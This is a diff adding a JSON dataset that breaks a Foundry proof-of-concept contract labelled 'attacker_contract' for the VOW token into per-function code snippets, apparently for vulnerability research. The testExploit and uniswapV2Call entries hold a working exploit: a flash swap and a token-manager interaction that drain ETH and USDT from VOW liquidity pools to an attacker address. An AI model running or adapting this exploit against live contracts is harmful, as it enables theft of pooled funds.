@@ -1,0 +1,100 @@
+[
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n\n        vm.startPrank(attacker);\n        IERC20(vow).approve(address(address(this)), type(uint256).max);\n        IERC20(vUSD).approve(address(address(this)), type(uint256).max);\n        vm.stopPrank();\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public balanceLog {\n        //implement exploit code here\n        emit log_named_decimal_uint(\n            \"Before exploit VOW balance of attacker:\", IERC20(vow).balanceOf(attacker), IERC20(vow).decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Before exploit USDT balance of attacker:\", IERC20(usdt).balanceOf(attacker), IERC20(usdt).decimals()\n        );\n        emit log_named_decimal_uint(\"Before exploit ETH balance of attacker:\", attacker.balance, 18);\n\n        uint256 vowBalance = IERC20(vow).balanceOf(VOW_WETH_Pair);\n        Uni_Pair_V2(VOW_WETH_Pair).swap(vowBalance - 1, 0, address(this), hex\"00\");\n\n        vowBalance = IERC20(vow).balanceOf(address(this));\n        IERC20(vow).transfer(attacker, vowBalance / 10);\n        (uint112 reserve0, uint112 reserve1,) = Uni_Pair_V2(VOW_WETH_Pair).getReserves();\n        vowBalance = IERC20(vow).balanceOf(address(this));\n        IERC20(vow).transfer(VOW_WETH_Pair, vowBalance / 2);\n\n        uint256 amount0In = IERC20(vow).balanceOf(VOW_WETH_Pair) - reserve0;\n        uint256 amount1Out = getAmount1Out(reserve0, reserve1, amount0In);\n        Uni_Pair_V2(VOW_WETH_Pair).swap(0, amount1Out, address(this), hex\"\");\n        IWETH(payable(weth)).withdraw(amount1Out);\n        (bool success,) = attacker.call{value: amount1Out}(\"\");\n        require(success, \"Fail to send eth\");\n\n        (reserve0, reserve1,) = Uni_Pair_V2(VOW_USDT_Pair).getReserves();\n        IERC20(vow).transfer(VOW_USDT_Pair, IERC20(vow).balanceOf(address(this)));\n        amount0In = IERC20(vow).balanceOf(VOW_USDT_Pair) - reserve0;\n        amount1Out = getAmount1Out(reserve0, reserve1, amount0In);\n        Uni_Pair_V2(VOW_USDT_Pair).swap(0, amount1Out, address(this), hex\"\");\n        (success,) = usdt.call(\n            abi.encodeWithSignature(\"transfer(address,uint256)\", attacker, IERC20(usdt).balanceOf(address(this)))\n        );\n        require(success, \"Fail to transfer USDT\");\n\n        emit log_named_decimal_uint(\n            \"After exploit: VOW balance of attacker:\", IERC20(vow).balanceOf(attacker), IERC20(vow).decimals()\n        );\n        emit log_named_decimal_uint(\n            \"After exploit: USDT balance of attacker:\", IERC20(usdt).balanceOf(attacker), IERC20(usdt).decimals()\n        );\n        emit log_named_decimal_uint(\"After exploit: ETH balance of attacker:\", attacker.balance, 18);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "VOW",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV2Call",
+    "original_code": "    function uniswapV2Call(address sender, uint256 amount0, uint256, bytes calldata) external {\n        require(msg.sender == VOW_WETH_Pair, \"not from pool\");\n        require(sender == address(this), \"not from this contract\");\n\n        IERC20(vow).transfer(attacker, amount0);\n\n        IERC20(vow).transferFrom(attacker, vscTokenManager, amount0);\n\n        uint256 vUSDBalance = IERC20(vUSD).balanceOf(attacker);\n        IERC20(vUSD).transferFrom(attacker, address(this), vUSDBalance);\n        (uint112 reserve0, uint112 reserve1,) = Uni_Pair_V2(vUSD_VOW_Pair).getReserves();\n        IERC20(vUSD).transfer(vUSD_VOW_Pair, vUSDBalance);\n\n        uint256 amount0In = IERC20(vUSD).balanceOf(vUSD_VOW_Pair) - reserve0;\n        uint256 amount1Out = getAmount1Out(reserve0, reserve1, amount0In);\n        Uni_Pair_V2(vUSD_VOW_Pair).swap(0, amount1Out, address(this), hex\"\");\n\n        uint256 fee = amount0 * 3 / 997 + 1000;\n        uint256 amountToPay = amount0 + fee;\n        IERC20(vow).transfer(VOW_WETH_Pair, amountToPay);\n    }\n\n",
+    "description": ""
+  }
+]
